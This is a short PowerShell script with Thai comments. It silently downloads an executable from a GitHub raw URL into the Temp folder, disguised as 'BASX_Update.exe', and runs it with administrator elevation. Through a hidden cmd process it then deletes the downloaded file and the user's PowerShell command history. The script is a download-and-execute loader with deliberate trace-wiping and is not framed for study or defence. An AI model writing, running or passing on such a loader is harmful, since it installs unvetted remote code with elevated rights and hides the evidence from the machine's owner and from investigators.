$ErrorActionPreference = 'SilentlyContinue'

# 1. โหลดไฟล์ไปที่ Temp (เข้าถึงง่ายสุด)
$output = "$env:TEMP\BASX_Update.exe"
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"

# 2. ดาวน์โหลด (ถ้ามีไฟล์เก่าให้ลบทิ้งก่อน)
if (Test-Path $output) { Remove-Item $output -Force }
(New-Object System.Net.WebClient).DownloadFile($url, $output)

# 3. สั่งรันแบบ Admin
if (Test-Path $output) {
    Start-Process -FilePath $output -Verb RunAs
}

# 4. ลบประวัติ (ใช้แผน CMD สั่งลาเหมือนเดิม)
$history = (Get-PSReadlineOption).HistorySavePath
Start-Process cmd -ArgumentList "/c timeout /t 5 && del /f /q `"$output`" && del /f /q `"$history`"" -WindowStyle Hidden

# 5. ปิดตัวเองทันที
exit
